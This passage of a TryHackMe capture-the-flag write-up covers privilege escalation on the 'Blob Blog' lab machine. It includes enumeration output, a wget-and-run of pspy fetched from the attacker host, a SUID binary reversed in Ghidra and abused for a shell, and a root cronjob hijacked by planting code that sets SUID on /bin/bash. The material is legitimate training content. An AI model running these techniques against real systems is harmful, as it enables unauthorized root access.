    link/ether 02:62:73:93:3b:31 brd ff:ff:ff:ff:ff:ff
    inet 10.10.35.23/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::62:73ff:fe93:3b31/64 scope link 
       valid_lft forever preferred_lft forever
www-data@bobloblaw-VirtualBox:~/html2$ ^C
www-data@bobloblaw-VirtualBox:~/html2$ 
```

I'm user `www-data`!

## Privilege Escalation

### www-data to bobloblaw

Let's do some basic enumerations!

**System users:**
```
www-data@bobloblaw-VirtualBox:~/html2$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
bobloblaw:x:1000:1000:bobloblaw,,,:/home/bobloblaw:/bin/bash
bob:x:1001:1001:,,,:/home/bob:/bin/bash

www-data@bobloblaw-VirtualBox:~/html2$ ls -lah /home
total 16K
drwxr-xr-x  4 root      root      4.0K Jul 25  2020 .
drwxr-xr-x 25 root      root      4.0K Jul 28  2020 ..
dr-xr-xr-x  3 bob       bob       4.0K Jul 25  2020 bob
drwxrwx--- 16 bobloblaw bobloblaw 4.0K Aug  6  2020 bobloblaw
```

- Found system user: `bob`, `bobloblaw`

**Cronjob:**
```
www-data@bobloblaw-VirtualBox:~/html2$ cat /etc/crontab
[...]
*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
```

**Weird cronjob run by `root`.**

**Kernel version:**
```
www-data@bobloblaw-VirtualBox:~/html2$ uname -a; cat /etc/issue
Linux bobloblaw-VirtualBox 4.10.0-19-generic #21-Ubuntu SMP Thu Apr 6 17:04:57 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 17.04 \n \l
```

Maybe it's vulnerable to kernel exploit?

**Monitor processes via `pspy`:**
```
┌──(root🌸siunam)-[/opt/pspy]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
www-data@bobloblaw-VirtualBox:~/html2$ wget http://10.9.0.253/pspy64 -O /tmp/pspy64;chmod +x /tmp/pspy64;/tmp/pspy64
[...]
2023/01/09 06:08:01 CMD: UID=0    PID=19415  | /usr/sbin/CRON -f 
2023/01/09 06:08:01 CMD: UID=0    PID=19414  | /usr/sbin/CRON -f 
2023/01/09 06:08:01 CMD: UID=0    PID=19413  | /usr/sbin/CRON -f 
2023/01/09 06:08:01 CMD: UID=0    PID=19421  | 
2023/01/09 06:08:01 CMD: UID=0    PID=19427  | gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring 
2023/01/09 06:08:01 CMD: UID=0    PID=19429  | /usr/bin/ld -plugin /usr/lib/gcc/x86_64-linux-gnu/6/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/6/lto-wrapper -plugin-opt=-fresolution=/tmp/ccCfzjRT.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --sysroot=/ --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro -o /home/bobloblaw/Documents/.also_boring/.still_boring /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/6/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/6 -L/usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/6/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/6/../../.. /tmp/ccwFaec5.o -lgcc --as-needed -lgcc_s --no-as-needed -lc -lgcc --as-needed -lgcc_s --no-as-needed /usr/lib/gcc/x86_64-linux-gnu/6/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/crtn.o 
2023/01/09 06:08:01 CMD: UID=0    PID=19428  | /usr/lib/gcc/x86_64-linux-gnu/6/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/6/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/6/lto-wrapper -plugin-opt=-fresolution=/tmp/ccCfzjRT.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --sysroot=/ --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro -o /home/bobloblaw/Documents/.also_boring/.still_boring /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/6/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/6 -L/usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/6/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/6/../../.. /tmp/ccwFaec5.o -lgcc --as-needed -lgcc_s --no-as-needed -lc -lgcc --as-needed -lgcc_s --no-as-needed /usr/lib/gcc/x86_64-linux-gnu/6/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/crtn.o 
You haven't rooted me yet? Jeez
```

Weird process ran by every minute.

**SUID binaries:**
```
www-data@bobloblaw-VirtualBox:~/html2$ find / -perm -4000 2>/dev/null
[...]
/usr/bin/blogFeedback
[...]
```

The `/usr/bin/blogFeedback` looks sussy.

**LinPEAS:**
```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588

╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
Vulnerable!!
[...]
╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
UUID=e35f9a1d-638e-495a-bda1-e289e1bab445	/	ext4	errors=remount-ro	0 1
[...]
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
You have write privileges over /etc/init/flask.conf
The following files aren't owned by root: /etc/init/flask.conf
```

**Interesting image files in `/var/www`:**
```
www-data@bobloblaw-VirtualBox:~$ ls -lah
total 1.4M
drwxr-xr-x  6 www-data www-data 4.0K Jan  9 06:13 .
drwxr-xr-x 15 root     root     4.0K Jul 25  2020 ..
lrwxrwxrwx  1 www-data www-data    9 Jul 29  2020 .bash_history -> /dev/null
drwx------  3 www-data www-data 4.0K Jan  9 06:13 .gnupg
drwxr-xr-x  2 www-data www-data 4.0K Jul 28  2020 html
drwxr-xr-x  4 www-data www-data 4.0K Jul 28  2020 html2
drwxr-xr-x  2 www-data www-data 4.0K Aug  6  2020 html4
-rw-rw-r--  1 www-data www-data 430K Jul 25  2020 reno2.jpg
-rw-rw-r--  1 www-data www-data 878K Jul 25  2020 reno.jpg
```

**Let's transfer them:**
```
www-data@bobloblaw-VirtualBox:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# wget http://$RHOSTS:8000/reno.jpg 

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# wget http://$RHOSTS:8000/reno2.jpg 
```

**`steghide`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# steghide extract -sf reno.jpg 
Enter passphrase: 
wrote extracted data to "dog.txt".
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# steghide extract -sf reno2.jpg 
Enter passphrase: 
wrote extracted data to "doggo.txt".
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# cat dog.txt 
i'm just a DOG, leave me alone
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# cat doggo.txt 
jcug xue, paw W's vhooz pxgz Moxhr'y gcm.  Lt O fcaor ikcuvs gqczksx dbopor, L'r vuchdprb pk d fgepow, qac mux xavh lritg o xdphlh nrzk!
```

The `doggo.txt` text is being rotated. Maybe it's another rabbit hole.

**Armed with above information, we can try to explore the `/usr/bin/blogFeedback` SUID binary:**
```
www-data@bobloblaw-VirtualBox:~/html2$ ls -lah /usr/bin/blogFeedback
-rwsrwxr-x 1 bobloblaw bobloblaw 17K Jul 25  2020 /usr/bin/blogFeedback

www-data@bobloblaw-VirtualBox:~/html2$ file /usr/bin/blogFeedback
/usr/bin/blogFeedback: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0786ba98be1278faaa52427a5d8137f94a843a70, for GNU/Linux 3.2.0, not stripped
```

As you can see, it's owned by user `bobloblaw`. Maybe we can escalate to user `bobloblaw` via that binary?

**Let's `strings` that:**
```
www-data@bobloblaw-VirtualBox:~/html2$ strings /usr/bin/blogFeedback 
[...]
Order my blogs!
Hmm... I disagree!
Now that, I can get behind!
/bin/sh
[...]
```

**Hmm... Let's transfer that to our attacker machine, and then use Ghidra to reverse engineer it:**
```
www-data@bobloblaw-VirtualBox:~/html2$ cd /usr/bin/
www-data@bobloblaw-VirtualBox:/usr/bin$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# wget http://$RHOSTS:8000/blogFeedback

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# ghidra
```

**Function `main()`:**
```c
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  int local_c;
  
  if ((param_1 < 7) || (7 < param_1)) {
    puts("Order my blogs!");
  }
  else {
    for (local_c = 1; local_c < 7; local_c = local_c + 1) {
      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
      if (iVar1 != 7 - local_c) {
        puts("Hmm... I disagree!");
        return 0;
      }
    }
    puts("Now that, I can get behind!");
    setreuid(1000,1000);
    system("/bin/sh");
  }
  return 0;
}
```

Let's break it down:

- If number of parameters is less than 7, prints "Order my blogs!". So we need to provide 6 parameters
- Then, the for loop will loop through our parameters, which is: `7-<parameter>`
- If we pass the check, it'll spawn a sh shell with effective UID 1000

**Armed with above information, we can pass the check via providing `6 5 4 3 2 1`:**
```
www-data@bobloblaw-VirtualBox:/usr/bin$ /usr/bin/blogFeedback 6 5 4 3 2 1
Now that, I can get behind!
$ whoami;hostname;id;ip a
bobloblaw
bobloblaw-VirtualBox
uid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:62:73:93:3b:31 brd ff:ff:ff:ff:ff:ff
    inet 10.10.35.23/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::62:73ff:fe93:3b31/64 scope link 
       valid_lft forever preferred_lft forever
$
```

I'm user `bobloblaw`!

**user.txt:**
```
$ cat /home/bobloblaw/Desktop/user.txt
THM{Redacted}

@jakeyee thank you so so so much for the help with the foothold on the box!!
```

### bobloblaw to root

**Now, we should check out the "You haven't rooted me yet? Jeez" cronjob:**
```
www-data@bobloblaw-VirtualBox:~/html2$ wget http://10.9.0.253/pspy64 -O /tmp/pspy64;chmod +x /tmp/pspy64;/tmp/pspy64
[...]
2023/01/09 06:08:01 CMD: UID=0    PID=19413  | /usr/sbin/CRON -f 
2023/01/09 06:08:01 CMD: UID=0    PID=19421  | 
2023/01/09 06:08:01 CMD: UID=0    PID=19427  | gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring 
```

**There is a `c` file in `/home/bobloblaw/Documents`:**
```
$ ls -lah /home/bobloblaw/Documents
total 16K
drwxr-xr-x  3 bobloblaw bobloblaw 4.0K Jul 30  2020 .
drwxrwx--- 16 bobloblaw bobloblaw 4.0K Aug  6  2020 ..
drwxrwx---  2 bobloblaw bobloblaw 4.0K Jan  9 06:58 .also_boring
-rw-rw----  1 bobloblaw bobloblaw   92 Jul 30  2020 .boring_file.c
```

**`.boring_file.c`:**
```c
#include <stdio.h>
int main() {
	printf("You haven't rooted me yet? Jeez\n");
	return 0;

}
```

Nothing weird.

**Now, since we're user `bobloblaw`, we can write access to `.boring_file.c`!**

**Why not replace it to a malicious one?**

```c
#include <stdlib.h>

int main(){
    system("chmod +s /bin/bash");
    return 0;
}
```

```bash
cat << EOF > /home/bobloblaw/Documents/.boring_file.c
> #include <stdlib.h>
> 
> int main(){
>   system("chmod +s /bin/bash");
>   return 0;
> }
```

This will add a SUID sticky bit to `/bin/bash`, which then we can spawn a Bash shell with root privilege.

**Then wait for the cronjob runs:**
```
$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Nov 15  2016 /bin/bash
```

**Nice! Let's spawn a root Bash shell:**
```
$ /bin/bash -p

bash-4.4# whoami;hostname;id;ip a
root
bobloblaw-VirtualBox
uid=1000(bobloblaw) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:62:73:93:3b:31 brd ff:ff:ff:ff:ff:ff
    inet 10.10.35.23/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::62:73ff:fe93:3b31/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
bash-4.4# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Decoding Base58 & Brainfuck & Vigenere Encoded String
2. Port Knocking
3. Enumerating FTP
4. Cracking Steganographic Image's Passphrase via `stegseek`
5. Enumerating Hidden Directories & Files via `gobuster`
6. Exploiting OS Command Injection
7. Reverse Engineering Executable via Ghidra
8. Vertical Privilege Escalation via Abusing Cronjob